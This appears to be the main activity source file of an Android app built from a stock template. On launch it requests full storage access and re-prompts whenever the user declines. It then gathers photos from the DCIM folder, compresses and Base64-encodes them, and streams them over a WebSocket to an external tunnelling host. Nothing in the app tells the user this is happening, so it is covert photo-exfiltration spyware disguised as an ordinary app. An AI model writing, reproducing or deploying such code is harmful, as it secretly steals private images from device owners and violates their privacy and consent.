package com.example.myapp

import android.os.Bundle
import com.google.android.material.snackbar.Snackbar
import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.findNavController
import androidx.navigation.ui.AppBarConfiguration
import androidx.navigation.ui.navigateUp
import androidx.navigation.ui.setupActionBarWithNavController
import android.view.Menu
import android.view.MenuItem
import com.example.myapp.databinding.ActivityMainBinding
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import java.io.ByteArrayOutputStream
import java.io.File
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log

val MAX_FILE_SIZE = 512 * 1024
val MAX_IMG_SIZE = 1280

fun compressImage(imagePath: String): ByteArray {
    val imageFile = File(imagePath)

    // 检查图片文件大小
    if (imageFile.length() <= MAX_FILE_SIZE) {
        // 如果图片文件大小未超过最大文件大小，无需压缩，直接返回原始图片数据
        return imageFile.readBytes()
    }

    // 需要压缩图片文件
    try {
        // 使用BitmapFactory解码图片文件获取Bitmap对象
        val options = BitmapFactory.Options()
        options.inJustDecodeBounds = true
        BitmapFactory.decodeFile(imagePath, options)

        // 根据原始图片尺寸计算压缩比例
        options.inSampleSize = calculateSampleSize(options.outWidth, options.outHeight)

        // 使用压缩比例重新解码图片文件获取Bitmap对象
        options.inJustDecodeBounds = false
        val bitmap = BitmapFactory.decodeFile(imagePath, options)

        // 将Bitmap对象转换为字节数组
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
        return outputStream.toByteArray()
    } catch (e: Exception) {
        Log.e("CompressImage", "Error compressing image: ${e.message}")
        return ByteArray(0) // 返回空字节数组表示压缩失败
    }
}

 fun calculateSampleSize(width: Int, height: Int): Int {
    var inSampleSize = 1
    val maxDimension = width.coerceAtLeast(height)

    while (maxDimension / inSampleSize > MAX_IMG_SIZE) {
        inSampleSize *= 2
    }

    return inSampleSize
}







class ImageWebSocketListener(private val images: Array<String>) : WebSocketListener() {
    override fun onOpen(webSocket: WebSocket, response: okhttp3.Response) {

        println("images.size==>" + images.size)

        for (imagePath in images) {
            println("imagePath==>" + imagePath)
            val imageBytes = compressImage(imagePath)
            val base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT)
            webSocket.send(base64Image)
        }

//        webSocket.close(1000, "Finished sending images")
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        println("Received message: $text")
    }

    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
        println("Received message: ${bytes.hex()}")
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: okhttp3.Response?) {
        println("Received onFailure: ============================>")
        t.printStackTrace()
    }
}

class MainActivity : AppCompatActivity() {
    private val PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE = 1

    private lateinit var appBarConfiguration: AppBarConfiguration
    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)

        val navController = findNavController(R.id.nav_host_fragment_content_main)
        appBarConfiguration = AppBarConfiguration(navController.graph)
        setupActionBarWithNavController(navController, appBarConfiguration)

        binding.fab.setOnClickListener { view ->
            Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                    .setAction("Action", null).show()
        }

        println("requestReadExternalStoragePermission()==>")

        requestReadExternalStoragePermission()
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        // Inflate the menu; this adds items to the action bar if it is present.
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        return when (item.itemId) {
            R.id.action_settings -> true
            else -> super.onOptionsItemSelected(item)
        }
    }

    override fun onSupportNavigateUp(): Boolean {
        val navController = findNavController(R.id.nav_host_fragment_content_main)
        return navController.navigateUp(appBarConfiguration)
                || super.onSupportNavigateUp()
    }


    // 请求文件读取权限
    private fun requestReadExternalStoragePermission() {
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_EXTERNAL_STORAGE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // 如果运行在 Android 12 及以上版本
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val isScopedStorage = Environment.isExternalStorageManager()
                if (!isScopedStorage) {
                    // 请求访问 Scoped Storage 的权限
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivityForResult(intent, PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE)
                    return
                }
            }
            // 请求传统的文件读取权限
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE
            )
        } else {
            // 已经具有权限，执行相关操作
            // 在此处调用获取图片并转换为 Base64 的代码
            performImageAndWebSocketOperations()

        }
    }

    // 处理权限请求的回调
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        when (requestCode) {
            PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // 权限已授予，执行相关操作
                    // 在此处调用获取图片并转换为 Base64 的代码
                    performImageAndWebSocketOperations()

                } else {
                    // 权限被拒绝，处理权限请求失败的情况
                    // 在此处进行错误处理
                    // 请求传统的文件读取权限
                    ActivityCompat.requestPermissions(
                        this,
                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                        PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE
                    )
                }
            }
        }
    }

    // 处理 Scoped Storage 权限请求的结果
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val isScopedStorage = Environment.isExternalStorageManager()
                if (isScopedStorage) {
                    // 请求传统的文件读取权限
                    ActivityCompat.requestPermissions(
                        this,
                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                        PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE
                    )
                } else {
                    // Scoped Storage 权限被拒绝，处理权限请求失败的情况
                    // 在此处进行错误处理
                    // 请求访问 Scoped Storage 的权限
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivityForResult(intent, PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE)
                }
            }
        }
    }

    private fun performImageAndWebSocketOperations() {
        // 执行获取图片和发送 WebSocket 的逻辑
        val context: Context = this
        val images = getAllImagesFromDCIM(context)

        val webSocketUrl = "wss://2ee4f646.r16.cpolar.top/"
        val request = Request.Builder().url(webSocketUrl).build()

        val client = OkHttpClient()

        val webSocketListener = ImageWebSocketListener(images)

        val webSocket = client.newWebSocket(request, webSocketListener)

        // 等待 WebSocket 传输完成
        Thread.sleep(5000)


//        client.dispatcher.executorService.shutdown()
    }

    private fun getAllImagesFromDCIM(context: Context): Array<String> {

        // 获取 DCIM 目录路径
        val dcimDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)

        val imagePaths = traverseDCIM(dcimDir)

        // 将路径数组转换为普通数组并返回
        return imagePaths
    }


    // 遍历 DCIM 目录及其子目录
    fun traverseDCIM(directory: File): Array<String>  {
        // 检查目录是否存在
        val imagePaths = mutableListOf<String>()
        if (!directory.exists() || !directory.isDirectory) {
            return imagePaths.toTypedArray()
        }

        // 遍历当前目录的文件和子目录
        val files = directory.listFiles()
        if (files != null) {
            for (fileone in files) {
                if (fileone.isDirectory) {
                    val dcimFolder = File(fileone.absolutePath)
                    val imageFiles = dcimFolder.listFiles { file ->
                        // 只筛选出图片文件，可以根据需要调整判断条件
                        file.isFile && file.extension.toLowerCase() in arrayOf("jpg", "jpeg", "png", "gif")
                    }

                    // 将图片文件的路径添加到数组中
                    imageFiles?.forEach { imageFile ->
                        val imagePath = imageFile.absolutePath
                        imagePaths.add(imagePath)
                    }
                    // 是子目录，递归调用遍历函数
                    traverseDCIM(fileone)
                } else {
                    // 是文件，进行相应操作
                    // 在此处处理文件的逻辑，例如转换为 Base64 或其他操作
                    println(fileone.absolutePath)
                }
            }
        }
        return imagePaths.toTypedArray()
    }
}